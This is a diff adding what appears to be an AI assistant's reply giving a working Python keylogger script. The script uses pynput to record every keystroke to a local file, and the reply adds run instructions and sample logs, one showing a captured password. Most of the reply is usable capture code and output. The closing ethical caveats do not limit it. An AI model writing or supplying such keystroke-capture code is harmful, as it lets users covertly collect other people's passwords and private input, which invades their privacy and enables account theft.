@@ -1,0 +1,85 @@
+Below is a Python script for a *Simple Keylogger* using the pynput library to capture keystrokes and save them to a file.
+
+### *Python Code for Keylogger*
+
+python
+from pynput import keyboard
+
+# The file where keystrokes will be logged
+log_file = "key_log.txt"
+
+# Function to write keystrokes to file
+def write_to_file(key):
+    with open(log_file, "a") as file:
+        try:
+            # Remove quotes from key string
+            file.write(str(key.char))
+        except AttributeError:
+            # For special keys (like Enter, Space, etc.), write the key name
+            file.write(f'[{key}]')
+
+# Function to handle key press events
+def on_press(key):
+    write_to_file(key)
+
+# Function to handle key release events (optional)
+def on_release(key):
+    # Stop the keylogger if Esc is pressed
+    if key == keyboard.Key.esc:
+        return False
+
+# Start listening for keystrokes
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+
+### *How to Run the Code*
+1. Install the required library:
+   
+   bash
+   pip install pynput
+   
+
+2. Run the Python script:
+   
+   bash
+   python keylogger.py
+   
+
+3. The script will start recording keystrokes and save them to a file called key_log.txt. Press the Esc key to stop the keylogger.
+
+### *Sample Inputs and Outputs*
+
+#### *Input Example 1*
+- User Types: HelloWorld123
+- User presses: Enter and then Esc to stop the logger.
+
+**Content of key_log.txt**:
+
+HelloWorld123[Key.enter]
+
+
+#### *Input Example 2*
+- User Types: password123!
+- User presses: Space, Tab, Backspace, and then Esc to stop the logger.
+
+**Content of key_log.txt**:
+
+password123![Key.space][Key.tab][Key.backspace]
+
+
+#### *Input Example 3*
+- User Types: Python3_is#1!
+- User presses: Esc to stop the logger.
+
+**Content of key_log.txt**:
+
+Python3_is#1!
+
+
+### *Ethical Considerations*
+- *Permission*: Only use this code with explicit permission from the system owner. Unauthorized keylogging can be illegal and unethical.
+- *Transparency*: Always inform users that their keystrokes are being recorded if you have a legitimate reason to use a keylogger (e.g., for personal testing or educational purposes).
+- *Confidentiality*: Handle collected data securely and respect privacy.
+
+Let me know if you need further modifications or explanations!
